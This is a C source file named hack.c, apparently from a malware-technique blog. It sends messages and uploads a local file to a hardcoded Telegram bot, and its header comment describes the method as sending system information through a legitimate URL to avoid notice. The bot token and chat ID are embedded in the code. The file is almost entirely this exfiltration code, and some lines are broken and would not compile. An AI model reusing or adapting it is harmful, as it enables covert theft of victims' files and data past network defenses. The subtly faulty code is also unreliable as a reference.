/*
 * hack.c
 * sending systeminfo via legit URL. Telegram API
 * author @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>

#define TOKEN "8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ"
#define CHAT_ID = "5547299598";

// send data to Telegram channel using winhttp
int sendToTgBot(const char* message) {
  const char* chatId = "5547299598";
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;

  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (hSession == NULL) {
    fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
    return 1;
  }

  hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect == NULL) {
    fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hSession);
  }

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (hRequest == NULL) {
    fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
  }

  // construct the request body
  char requestBody[512];
  sprintf(requestBody, "chat_id=%s&text=%s", chatId, message);

  // set the headers
  if (!WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", -1, requestBody, strlen(requestBody), strlen(requestBody), 0)) {
    fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hSession);

  printf("successfully sent to tg bot :)\n");
  return 0;
}

// send file to Telegram channel using WinHTTP
int sendFileToTgBot(const char* filePath) {
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;
  
  const char* url = "https://api.telegram.org/bot" TOKEN "/sendDocument";
  
  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (hSession == NULL) {
    fprintf(stderr, "WinHttpOpen. Error: %d\n", GetLastError());
    return 1;
  }

  hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect == NULL) {
    fprintf(stderr, "WinHttpConnect. Error: %d\n", GetLastError());
    WinHttpCloseHandle(hSession);
    return 1;
  }

  hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot" TOKEN "/sendDocument", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (hRequest == NULL) {
    fprintf(stderr, "WinHttpOpenRequest. Error: %d\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  // Prepare the multipart form-data
  char boundary[] = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
  char header[512];
  snprintf(header, sizeof(header), "Content-Type: multipart/form-data; boundary=%s", boundary);

  // Prepare the POST data for file and parameters
  char postData[4096];
  snprintf(postData, sizeof(postData),
           "--%s\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n%s\r\n"
           "--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n",
           boundary, CHAT_ID, boundary, filePath);

  // Open the file
  FILE* file = fopen(filePath, "rb");
  if (file == NULL) {
    fprintf(stderr, "Error opening file: %s\n", filePath);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  // Read the file into a buffer
  fseek(file, 0, SEEK_END);
  long fileSize = ftell(file);
  fseek(file, 0, SEEK_SET);
  char* fileBuffer = (char*)malloc(fileSize);
  fread(fileBuffer, 1, fileSize, file);
  fclose(file);

  // Send the request with the file data
  DWORD bytesSent = 0;
  if (!WinHttpSendRequest(hRequest,
                          header, -1, 
                          postData, strlen(postData), 
                          strlen(postData) + fileSize, 
                          0)) {
    fprintf(stderr, "WinHttpSendRequest. Error: %d\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    free(fileBuffer);
    return 1;
  }

  // Send the file content
  if (!WinHttpWriteData(hRequest, fileBuffer, fileSize, &bytesSent)) {
    fprintf(stderr, "WinHttpWriteData. Error: %d\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    free(fileBuffer);
    return 1;
  }

  // Send the boundary end
  char boundaryEnd[] = "\r\n--" boundary "--\r\n";
  if (!WinHttpWriteData(hRequest, boundaryEnd, strlen(boundaryEnd), &bytesSent)) {
    fprintf(stderr, "WinHttpWriteData. Error: %d\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    free(fileBuffer);
    return 1;
  }

  // Receive the response
  DWORD statusCode = 0;
  DWORD statusCodeSize = sizeof(statusCode);
  if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                           WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, 
                           WINHTTP_NO_HEADER_INDEX)) {
    fprintf(stderr, "WinHttpQueryHeaders. Error: %d\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    free(fileBuffer);
    return 1;
  }

  // Check the response
  if (statusCode == 200) {
    printf("successfully sent file to Telegram bot.\n");
  } else {
    printf("failed to send file. HTTP Status Code: %d\n", statusCode);
  }

  // Clean up
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  free(fileBuffer);

  return 0;
}

// get systeminfo and send to chat via tgbot logic
int main(int argc, char* argv[]) {

  // test tgbot sending message
  char test[1024];
  const char* message = "meow-meow";
  snprintf(test, sizeof(test), "%s", message);
  sendToTgBot(test);

  // test sending file
  const char* filePath = "test.pdf";
  int result = sendFileToTgBot(filePath);

  if (result == 0) {
    printf("file sent successfully =^..^=\n");
  } else {
    printf("failed to send file :(\n");
  }

  return 0;
}